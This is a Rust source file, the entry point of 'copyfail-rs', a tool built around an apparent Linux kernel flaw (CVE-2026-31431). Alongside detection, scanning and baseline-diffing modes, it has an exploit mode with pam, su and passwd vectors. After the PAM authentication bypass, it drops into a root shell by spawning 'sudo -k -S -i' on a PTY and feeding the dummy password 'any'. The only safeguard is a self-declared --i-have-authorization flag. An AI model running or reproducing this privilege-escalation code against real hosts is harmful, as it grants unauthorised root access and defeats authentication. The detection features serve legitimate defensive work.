#![no_std]
#![no_main]

use copyfail_rs::detect::baseline::{diff_baseline, write_baseline};
use copyfail_rs::detect::check::{run_check_with_sources, CheckSources, Verdict};
use copyfail_rs::detect::hunt::run_hunt;
use copyfail_rs::detect::output::{check_human, check_json, diff_human, scan_human, scan_json, OUT_BUF};
use copyfail_rs::detect::scan::{default_paths, run_scan};
use copyfail_rs::detect::watch::run_watch;
use copyfail_rs::post_exploit::{decide_post_action, PostAction, PAM_BYPASS_HINT};
use copyfail_rs::vectors::{self, pam::PamVector};
use copyfail_rs::{check_kernel, CopyFail, Error, Vector};
use core::ffi::CStr;
use heapless::String;

#[panic_handler]
fn panic(_: &core::panic::PanicInfo) -> ! {
    unsafe {
        libc::syscall(libc::SYS_exit_group, 134);
    }
    loop {}
}

#[no_mangle]
pub extern "C" fn rust_eh_personality() {}

const USAGE: &[u8] = b"copyfail-rs (CVE-2026-31431)\n\
Usage:\n\
  copyfail --check\n\
  copyfail --mode exploit --vector <pam|su|passwd|auto> --i-have-authorization\n\
                   [--no-shell] [--json]\n\
  copyfail --mode detect --check [--json]\n\
  copyfail --mode detect --scan [--json] [PATH ...]\n\
  copyfail --mode detect --baseline FILE [PATH ...]\n\
  copyfail --mode detect --diff FILE [--json]\n\
  copyfail --mode detect --watch [--interval SECS]\n\
  copyfail --mode detect --hunt --hosts FILE\n\
  copyfail --help\n\
\n\
Exploit-mode flags (PAM only):\n\
  Default (TTY, no --no-shell/--json): allocates a PTY and drops a root\n\
              shell via `sudo -k -S -i` after the bypass is active.\n\
  --no-shell  Suppress the auto-shell drop; print the manual sudo hint.\n\
  --json      Emit machine-readable JSON status (also suppresses shell drop).\n";

#[no_mangle]
#[allow(clippy::not_unsafe_ptr_arg_deref)]
pub extern "C" fn main(argc: i32, argv: *const *const u8) -> i32 {
    let args = unsafe { Args::parse(argc, argv) };
    match args.cmd {
        Cmd::Check => run_check(),
        Cmd::Exploit => run_exploit(&args),
        Cmd::Detect => run_detect(&args),
        Cmd::Help => { write_stderr(USAGE); 0 }
        Cmd::Bad => { write_stderr(USAGE); 2 }
    }
}

#[derive(Clone, Copy)]
enum Cmd { Check, Exploit, Detect, Help, Bad }

#[derive(Clone, Copy, PartialEq, Eq)]
enum VectorChoice { None, Pam, Su, Passwd, Auto }

#[derive(Clone, Copy, PartialEq, Eq)]
enum DetectSub { None, Check, Scan, Baseline, Diff, Watch, Hunt }

struct Args {
    cmd: Cmd,
    vector: VectorChoice,
    authorized: bool,
    detect_sub: DetectSub,
    json: bool,
    strict: bool,
    no_shell: bool,
    interval_secs: u32,
    file_arg: *const u8,
    extra_paths: [*const u8; 32],
    extra_paths_len: usize,
}

impl Args {
    fn empty() -> Args {
        Args {
            cmd: Cmd::Help,
            vector: VectorChoice::None,
            authorized: false,
            detect_sub: DetectSub::None,
            json: false,
            strict: false,
            no_shell: false,
            interval_secs: 60,
            file_arg: core::ptr::null(),
            extra_paths: [core::ptr::null(); 32],
            extra_paths_len: 0,
        }
    }

    unsafe fn parse(argc: i32, argv: *const *const u8) -> Args {
        let mut a = Args::empty();
        if argc < 2 {
            return a;
        }
        a.cmd = Cmd::Bad;
        let mut i: isize = 1;
        while (i as i32) < argc {
            let arg = *argv.offset(i);
            if cstr_eq(arg, b"--help\0") || cstr_eq(arg, b"-h\0") {
                a.cmd = Cmd::Help;
            } else if cstr_eq(arg, b"--check\0") {
                if matches!(a.cmd, Cmd::Detect) {
                    a.detect_sub = DetectSub::Check;
                } else {
                    a.cmd = Cmd::Check;
                }
            } else if cstr_eq(arg, b"--i-have-authorization\0") {
                a.authorized = true;
            } else if cstr_eq(arg, b"--mode\0") {
                i += 1;
                if (i as i32) >= argc { a.cmd = Cmd::Bad; return a; }
                let m = *argv.offset(i);
                if cstr_eq(m, b"exploit\0") {
                    a.cmd = Cmd::Exploit;
                } else if cstr_eq(m, b"detect\0") {
                    a.cmd = Cmd::Detect;
                } else {
                    a.cmd = Cmd::Bad;
                    return a;
                }
            } else if cstr_eq(arg, b"--vector\0") {
                i += 1;
                if (i as i32) >= argc { a.cmd = Cmd::Bad; return a; }
                let v = *argv.offset(i);
                a.vector = if cstr_eq(v, b"pam\0") { VectorChoice::Pam }
                    else if cstr_eq(v, b"su\0") { VectorChoice::Su }
                    else if cstr_eq(v, b"passwd\0") { VectorChoice::Passwd }
                    else if cstr_eq(v, b"auto\0") { VectorChoice::Auto }
                    else { a.cmd = Cmd::Bad; return a; };
            } else if cstr_eq(arg, b"--scan\0") && matches!(a.cmd, Cmd::Detect) {
                a.detect_sub = DetectSub::Scan;
            } else if cstr_eq(arg, b"--baseline\0") && matches!(a.cmd, Cmd::Detect) {
                a.detect_sub = DetectSub::Baseline;
                i += 1;
                if (i as i32) >= argc { a.cmd = Cmd::Bad; return a; }
                a.file_arg = *argv.offset(i);
            } else if cstr_eq(arg, b"--diff\0") && matches!(a.cmd, Cmd::Detect) {
                a.detect_sub = DetectSub::Diff;
                i += 1;
                if (i as i32) >= argc { a.cmd = Cmd::Bad; return a; }
                a.file_arg = *argv.offset(i);
            } else if cstr_eq(arg, b"--watch\0") && matches!(a.cmd, Cmd::Detect) {
                a.detect_sub = DetectSub::Watch;
            } else if cstr_eq(arg, b"--hunt\0") && matches!(a.cmd, Cmd::Detect) {
                a.detect_sub = DetectSub::Hunt;
            } else if cstr_eq(arg, b"--hosts\0") {
                i += 1;
                if (i as i32) >= argc { a.cmd = Cmd::Bad; return a; }
                a.file_arg = *argv.offset(i);
            } else if cstr_eq(arg, b"--interval\0") {
                i += 1;
                if (i as i32) >= argc { a.cmd = Cmd::Bad; return a; }
                a.interval_secs = parse_u32(*argv.offset(i));
            } else if cstr_eq(arg, b"--json\0") {
                a.json = true;
            } else if cstr_eq(arg, b"--strict\0") {
                a.strict = true;
            } else if cstr_eq(arg, b"--no-shell\0") {
                a.no_shell = true;
            } else if matches!(a.cmd, Cmd::Detect)
                && matches!(a.detect_sub, DetectSub::Scan | DetectSub::Baseline)
                && a.extra_paths_len < a.extra_paths.len()
            {
                a.extra_paths[a.extra_paths_len] = arg;
                a.extra_paths_len += 1;
            }
            i += 1;
        }
        a
    }
}

unsafe fn cstr_eq(p: *const u8, b: &[u8]) -> bool {
    let mut i = 0;
    loop {
        let c = *p.add(i);
        if i >= b.len() { return c == 0 && b.last() == Some(&0); }
        if c != b[i] { return false; }
        if c == 0 && b[i] == 0 { return true; }
        i += 1;
    }
}

unsafe fn parse_u32(p: *const u8) -> u32 {
    let mut n: u32 = 0;
    let mut i = 0;
    loop {
        let c = *p.add(i);
        if c == 0 { break; }
        if !c.is_ascii_digit() { return 0; }
        n = n.saturating_mul(10).saturating_add((c - b'0') as u32);
        i += 1;
    }
    n
}

fn run_check() -> i32 {
    match check_kernel() {
        Ok(s) => {
            write_stderr(b"copyfail-rs --check (foundation facts)\n");
            write_stderr(b"  kernel: ");
            write_stderr(&s.osrelease[..s.osrelease_len]);
            write_stderr(b"\n  algif_aead module:        ");
            write_stderr(if s.algif_aead_module { b"present" } else { b"not in /proc/modules (may be builtin)" });
            write_stderr(b"\n  authencesn template:      ");
            write_stderr(if s.authencesn_template { b"present in /proc/crypto" } else { b"NOT present in /proc/crypto" });
            write_stderr(b"\n  hint:                     run `--mode detect --check` for full verdict\n");
            0
        }
        Err(_) => {
            write_stderr(b"--check: failed to read /proc files\n");
            1
        }
    }
}

fn run_exploit(args: &Args) -> i32 {
    if !args.authorized {
        write_stderr(b"--mode exploit requires --i-have-authorization\n");
        return 2;
    }
    match args.vector {
        VectorChoice::Pam => run_vector_pam(args),
        VectorChoice::Su => run_vector_named(b"su"),
        VectorChoice::Passwd => run_vector_named(b"passwd"),
        VectorChoice::Auto => run_vector_auto(args),
        VectorChoice::None => {
            write_stderr(b"--mode exploit requires --vector <pam|su|passwd|auto>\n");
            2
        }
    }
}

fn run_vector_named(name: &[u8]) -> i32 {
    let v = match vectors::select(name) {
        Some(v) => v,
        None => {
            write_stderr(b"vector unavailable\n");
            return 5;
        }
    };
    run_vector(v)
}

fn run_vector_auto(args: &Args) -> i32 {
    let pam = PamVector::new();
    if matches!(pam.applicable(), Ok(true)) {
        return run_vector_pam(args);
    }
    for name in &[&b"su"[..], &b"passwd"[..]] {
        if let Some(v) = vectors::select(name) {
            if matches!(v.applicable(), Ok(true)) {
                return run_vector(v);
            }
        }
    }
    write_stderr(b"--vector auto: no applicable vector on this host\n");
    5
}

fn run_vector(v: &dyn Vector) -> i32 {
    match v.applicable() {
        Ok(true) => {}
        Ok(false) => {
            write_stderr(v.name().as_bytes());
            write_stderr(b": not applicable on this host (kernel patched, target absent, or precondition not met)\n");
            return 6;
        }
        Err(_) => {
            write_stderr(v.name().as_bytes());
            write_stderr(b": applicability probe failed\n");
            return 7;
        }
    }
    let mut prim = match CopyFail::new() {
        Ok(p) => p,
        Err(e) => {
            write_stderr(v.name().as_bytes());
            write_stderr(b": CopyFail::new failed (kernel mitigated?)\n");
            return err_code(e);
        }
    };
    write_stderr(b"[+] running vector: ");
    write_stderr(v.name().as_bytes());
    write_stderr(b"\n");
    match v.execute(&mut prim) {
        Ok(()) => 0,
        Err(_) => {
            write_stderr(b"[-] vector execute returned without execve(); exploit failed\n");
            err_code(Error::Io)
        }
    }
}

fn run_vector_pam(args: &Args) -> i32 {
    let v = PamVector::new();
    match v.applicable() {
        Ok(true) => {}
        Ok(false) => {
            write_stderr(b"pam: not applicable on this host (distro/file/permit check failed)\n");
            return 4;
        }
        Err(_) => {
            write_stderr(b"pam: applicability probe failed\n");
            return 4;
        }
    }

    let mut prim = match CopyFail::new() {
        Ok(p) => p,
        Err(e) => {
            write_stderr(b"pam: CopyFail::new failed\n");
            return err_code(e);
        }
    };

    match v.execute(&mut prim) {
        Ok(()) => {
            // FIX 1+3: post-exploit dispatch.
            let stdin_is_tty = unsafe { libc::isatty(0) } == 1;
            match decide_post_action(args.json, args.no_shell, stdin_is_tty) {
                PostAction::DropShell => drop_root_shell_via_sudo(),
                PostAction::PrintHint => {
                    write_stderr(b"pam: bypass active. To get a root shell: ");
                    write_stderr(PAM_BYPASS_HINT);
                    write_stderr(b"\n");
                    0
                }
                PostAction::EmitJson => {
                    write_stdout(b"{\"vector\":\"pam\",\"outcome\":\"success\",\"bypass_active\":true,\"hint\":\"");
                    write_stdout(PAM_BYPASS_HINT);
                    write_stdout(b"\"}\n");
                    0
                }
            }
        }
        Err(e) => {
            write_stderr(b"pam: execute failed\n");
            err_code(e)
        }
    }
}

// ----- PTY drop-into-root-shell (FIX 1) -----
//
// After PAM bypass, fork a child that exec's `sudo -k -S -i` on a controlling
// PTY. The parent feeds "any\n" as the password (PAM bypass makes any string
// authenticate) and relays bytes between the user's terminal and the child
// shell until the shell exits.
//
// Why this dance and not just `system("sudo -i")`:
//   - sudo opens /dev/tty for password reading by default; -S redirects to
//     stdin, but only if stdin is a terminal-ish fd. A fresh PTY satisfies
//     that and gives us a real controlling terminal for the resulting bash.
//   - Without a PTY, bash prints "bash: cannot set terminal process group"
//     and refuses job control. Operator wants Ctrl-C / Ctrl-Z / tab
//     completion / etc. to work.
//   - Without raw mode on parent's stdin, the kernel line-disciplines the
//     operator's keystrokes (line buffering, local echo) — useless for an
//     interactive shell.
//
// Known limitation (v1): if this process is killed by SIGTERM/SIGKILL/SIGQUIT
// between cfmakeraw and tcsetattr(orig), the operator's terminal stays in
// raw mode. Recovery: `stty sane`. Adding a SIGTERM handler that restores
// termios requires a static-mut termios store which is awkward in this
// no_std/panic=abort bin. Documented for the future-work list.
fn drop_root_shell_via_sudo() -> i32 {
    let mut orig_termios: libc::termios = unsafe { core::mem::zeroed() };
    let saved = unsafe { libc::tcgetattr(0, &mut orig_termios) } == 0;

    let master = unsafe {
        libc::open(c"/dev/ptmx".as_ptr(), libc::O_RDWR | libc::O_NOCTTY)
    };
    if master < 0 {
        write_stderr(b"pam: open(/dev/ptmx) failed\n");
        return 1;
    }
    if unsafe { libc::grantpt(master) } != 0 || unsafe { libc::unlockpt(master) } != 0 {
        unsafe { libc::close(master); }
        write_stderr(b"pam: grantpt/unlockpt failed\n");
        return 1;
    }

    let mut slave_name = [0u8; 128];
    if unsafe {
        libc::ptsname_r(
            master,
            slave_name.as_mut_ptr() as *mut _,
            slave_name.len(),
        )
    } != 0
    {
        unsafe { libc::close(master); }
        write_stderr(b"pam: ptsname_r failed\n");
        return 1;
    }

    let pid = unsafe { libc::fork() };
    if pid < 0 {
        unsafe { libc::close(master); }
        write_stderr(b"pam: fork failed\n");
        return 1;
    }

    if pid == 0 {
        // CHILD: detach, take controlling TTY on slave, exec sudo.
        unsafe {
            libc::close(master);
            libc::setsid();
            let slave = libc::open(slave_name.as_ptr() as *const _, libc::O_RDWR);
            if slave < 0 {
                libc::syscall(libc::SYS_exit_group, 1);
                core::hint::unreachable_unchecked()
            }
            libc::ioctl(slave, libc::TIOCSCTTY, 0);
            libc::dup2(slave, 0);
            libc::dup2(slave, 1);
            libc::dup2(slave, 2);
            if slave > 2 {
                libc::close(slave);
            }
            // Reviewer H3: close every other fd before exec so a parent that
            // launched us with extra fds open doesn't leak them into sudo.
            // close_range is Linux 5.9+ (target VM is 6.17). Errors ignored —
            // worst case some fd 3+ is closed-on-exec already.
            libc::syscall(libc::SYS_close_range, 3u32, !0u32, 0u32);
            // sudo -k invalidates user's timestamp cache, -S reads pw from
            // stdin, -i runs login shell. argv[0] = "sudo".
            let path = b"/usr/bin/sudo\0";
            let arg0 = b"sudo\0";
            let arg1 = b"-k\0";
            let arg2 = b"-S\0";
            let arg3 = b"-i\0";
            let argv: [*const u8; 5] = [
                arg0.as_ptr(),
                arg1.as_ptr(),
                arg2.as_ptr(),
                arg3.as_ptr(),
                core::ptr::null(),
            ];
            libc::execv(path.as_ptr() as *const _, argv.as_ptr() as *const *const _);
            libc::syscall(libc::SYS_exit_group, 127);
            core::hint::unreachable_unchecked()
        }
    }

    // PARENT: raw stdin, feed password, relay until child exits.
    if saved {
        let mut raw = orig_termios;
        unsafe { libc::cfmakeraw(&mut raw); }
        unsafe { libc::tcsetattr(0, libc::TCSANOW, &raw); }
    }

    // Feed "any\n" so sudo's PAM call has something to read; the bypass
    // does the rest.
    let pw = b"any\n";
    unsafe { libc::write(master, pw.as_ptr() as *const _, pw.len()); }

    let mut fds = [
        libc::pollfd { fd: 0, events: libc::POLLIN, revents: 0 },
        libc::pollfd { fd: master, events: libc::POLLIN, revents: 0 },
    ];
    let mut buf = [0u8; 4096];
    'relay: loop {
        let r = unsafe { libc::poll(fds.as_mut_ptr(), 2, -1) };
        if r < 0 {
            let e = unsafe { *libc::__errno_location() };
            if e == libc::EINTR {
                continue;
            }
            break;
        }
        // stdin -> master.
        // Reviewer M2: handle POLLHUP without POLLIN so a closed-pipe stdin
        // doesn't busy-loop the relay.
        if fds[0].revents & (libc::POLLIN | libc::POLLHUP) != 0 {
            let n = unsafe { libc::read(0, buf.as_mut_ptr() as *mut _, buf.len()) };
            if n > 0 {
                let mut off = 0usize;
                while off < n as usize {
                    let w = unsafe {
                        libc::write(master, buf.as_ptr().add(off) as *const _, n as usize - off)
                    };
                    if w <= 0 { break 'relay; }
                    off += w as usize;
                }
            } else {
                // EOF or POLLHUP with no data: stop polling stdin, keep
                // draining master until child exits.
                fds[0].fd = -1;
            }
        }
        // master -> stdout
        if fds[1].revents & libc::POLLIN != 0 {
            let n = unsafe { libc::read(master, buf.as_mut_ptr() as *mut _, buf.len()) };
            if n > 0 {
                let mut off = 0usize;
                while off < n as usize {
                    let w = unsafe {
                        libc::write(1, buf.as_ptr().add(off) as *const _, n as usize - off)
                    };
                    if w <= 0 { break 'relay; }
                    off += w as usize;
                }
            } else {
                // child closed slave -> shell exited.
                break;
            }
        }
        if fds[1].revents & (libc::POLLHUP | libc::POLLERR) != 0 {
            // Drain any final bytes, then exit. Reviewer H2: retry on short
            // writes so a slow stdout doesn't lose the shell's exit message.
            loop {
                let n = unsafe { libc::read(master, buf.as_mut_ptr() as *mut _, buf.len()) };
                if n <= 0 { break; }
                let mut off = 0usize;
                while off < n as usize {
                    let w = unsafe {
                        libc::write(1, buf.as_ptr().add(off) as *const _, n as usize - off)
                    };
                    if w <= 0 { break; }
                    off += w as usize;
                }
            }
            break;
        }
    }

    let mut status: i32 = 0;
    unsafe { libc::waitpid(pid, &mut status, 0); }

    if saved {
        unsafe { libc::tcsetattr(0, libc::TCSANOW, &orig_termios); }
    }
    unsafe { libc::close(master); }

    if libc::WIFEXITED(status) {
        libc::WEXITSTATUS(status)
    } else {
        1
    }
}

fn run_detect(args: &Args) -> i32 {
    match args.detect_sub {
        DetectSub::Check => detect_check(args.json, args.strict),
        DetectSub::Scan => detect_scan(args),
        DetectSub::Baseline => detect_baseline(args),
        DetectSub::Diff => detect_diff(args),
        DetectSub::Watch => detect_watch(args),
        DetectSub::Hunt => detect_hunt(args),
        DetectSub::None => { write_stderr(USAGE); 2 }
    }
}

fn detect_check(json: bool, strict: bool) -> i32 {
    let kr = match check_kernel() {
        Ok(k) => k,
        Err(_) => return 1,
    };
    let mut path_buf: [u8; 192] = [0u8; 192];
    let prefix = b"/boot/config-";
    let kernel = &kr.osrelease[..kr.osrelease_len];
    if prefix.len() + kernel.len() + 1 > path_buf.len() { return 1; }
    path_buf[..prefix.len()].copy_from_slice(prefix);
    path_buf[prefix.len()..prefix.len() + kernel.len()].copy_from_slice(kernel);
    let boot_cstr = match CStr::from_bytes_until_nul(&path_buf) {
        Ok(c) => c,
        Err(_) => return 1,
    };

    let sources = CheckSources {
        proc_modules: c"/proc/modules",
        proc_crypto: c"/proc/crypto",
        boot_config: boot_cstr,
        modprobe_d_dir: c"/etc/modprobe.d",
        osrelease: c"/proc/sys/kernel/osrelease",
    };
    let report = match run_check_with_sources(&sources) {
        Ok(r) => r,
        Err(_) => return 1,
    };

    let mut out: String<OUT_BUF> = String::new();
    if json { check_json(&report, &mut out); } else { check_human(&report, &mut out); }
    write_stdout(out.as_bytes());

    if strict && matches!(report.verdict, Verdict::Vulnerable) { 4 } else { 0 }
}

fn detect_scan(args: &Args) -> i32 {
    let mut paths: heapless::Vec<&CStr, 64> = heapless::Vec::new();

    if args.extra_paths_len > 0 {
        for i in 0..args.extra_paths_len {
            unsafe {
                let cstr = CStr::from_ptr(args.extra_paths[i] as *const _);
                let _ = paths.push(cstr);
            }
        }
    } else {
        for cstr in default_paths().iter() {
            let _ = paths.push(*cstr);
        }
    }

    let report = match run_scan(&paths) {
        Ok(r) => r,
        Err(_) => return 1,
    };

    let mut out: String<OUT_BUF> = String::new();
    if args.json { scan_json(&report, &mut out); } else { scan_human(&report, &mut out); }
    write_stdout(out.as_bytes());

    if args.strict && report.any_tampered() { 4 } else { 0 }
}

fn detect_baseline(args: &Args) -> i32 {
    if args.file_arg.is_null() { write_stderr(USAGE); return 2; }
    let out_cstr = unsafe { CStr::from_ptr(args.file_arg as *const _) };

    let mut paths: heapless::Vec<&CStr, 64> = heapless::Vec::new();
    if args.extra_paths_len > 0 {
        for i in 0..args.extra_paths_len {
            unsafe {
                let cstr = CStr::from_ptr(args.extra_paths[i] as *const _);
                let _ = paths.push(cstr);
            }
        }
    } else {
        for cstr in default_paths().iter() {
            let _ = paths.push(*cstr);
        }
    }

    match write_baseline(out_cstr, &paths) {
        Ok(n) => {
            write_stderr(b"baseline written: ");
            write_num(n);
            write_stderr(b" entries\n");
            0
        }
        Err(_) => { write_stderr(b"baseline: write failed\n"); 1 }
    }
}

fn detect_diff(args: &Args) -> i32 {
    if args.file_arg.is_null() { write_stderr(USAGE); return 2; }
    let in_cstr = unsafe { CStr::from_ptr(args.file_arg as *const _) };
    match diff_baseline(in_cstr) {
        Ok(diffs) => {
            let mut out: String<OUT_BUF> = String::new();
            diff_human(&diffs, &mut out);
            write_stdout(out.as_bytes());
            if args.strict && !diffs.is_empty() { 4 } else { 0 }
        }
        Err(_) => 1,
    }
}

fn detect_watch(args: &Args) -> i32 {
    let mut paths: heapless::Vec<&CStr, 64> = heapless::Vec::new();
    for cstr in default_paths().iter() {
        let _ = paths.push(*cstr);
    }
    let interval = if args.interval_secs == 0 { 60 } else { args.interval_secs };
    match run_watch(&paths, interval) {
        Ok(_) => 0,
        Err(_) => 1,
    }
}

fn detect_hunt(args: &Args) -> i32 {
    if args.file_arg.is_null() { write_stderr(USAGE); return 2; }
    let cstr = unsafe { CStr::from_ptr(args.file_arg as *const _) };
    match run_hunt(cstr) {
        Ok(_) => 0,
        Err(_) => 1,
    }
}

fn err_code(_e: Error) -> i32 { 3 }

fn write_stderr(b: &[u8]) {
    unsafe { libc::write(2, b.as_ptr() as *const _, b.len()); }
}

fn write_stdout(b: &[u8]) {
    unsafe { libc::write(1, b.as_ptr() as *const _, b.len()); }
}

fn write_num(n: usize) {
    let mut buf = [0u8; 32];
    let mut i = buf.len();
    let mut v = n;
    if v == 0 {
        i -= 1;
        buf[i] = b'0';
    } else {
        while v > 0 {
            i -= 1;
            buf[i] = b'0' + (v % 10) as u8;
            v /= 10;
        }
    }
    write_stderr(&buf[i..]);
}
